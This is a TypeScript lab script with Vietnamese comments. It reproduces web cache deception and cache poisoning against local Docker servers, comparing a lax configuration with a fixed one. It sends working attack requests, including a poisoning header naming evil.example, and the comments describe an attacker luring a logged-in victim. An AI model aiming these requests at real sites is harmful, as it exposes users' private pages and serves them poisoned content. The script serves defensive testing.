// Tái hiện hai lỗ hổng cache trên máy mình (compose.yaml cùng thư mục), so cấu hình lỏng (8090) với đã sửa (8091).
// Chuẩn bị: docker compose -p atlas-sec up -d
// Chạy:     node attack.ts
async function get(port: number, path: string, headers: Record<string, string> = {}) {
  const res = await fetch(`http://localhost:${port}${path}`, { headers });
  return `${String(res.headers.get('x-cache-status') ?? '-').padEnd(6)} ${(await res.text()).slice(0, 70)}`;
}

for (const port of [8090, 8091]) {
  console.log(`\n=== cổng ${port} (${port === 8090 ? 'cấu hình lỏng' : 'cấu hình đã sửa'}) ===`);

  console.log('1) Web cache deception');
  // Kẻ xấu gửi cho nạn nhân link /account/avatar.css; nạn nhân bấm vào khi đang đăng nhập
  console.log(`   nạn nhân (có cookie) mở /account/avatar.css → ${await get(port, '/account/avatar.css', { cookie: 'session=lan' })}`);
  // Sau đó kẻ xấu mở đúng URL đó, không có cookie nào
  console.log(`   kẻ xấu (không cookie) mở cùng URL       → ${await get(port, '/account/avatar.css')}`);

  console.log('2) Cache poisoning qua header không nằm trong khóa cache');
  console.log(`   kẻ xấu gửi X-Forwarded-Host: evil.example → ${await get(port, '/', { 'x-forwarded-host': 'evil.example' })}`);
  console.log(`   người dùng bình thường mở trang chủ      → ${await get(port, '/')}`);
}
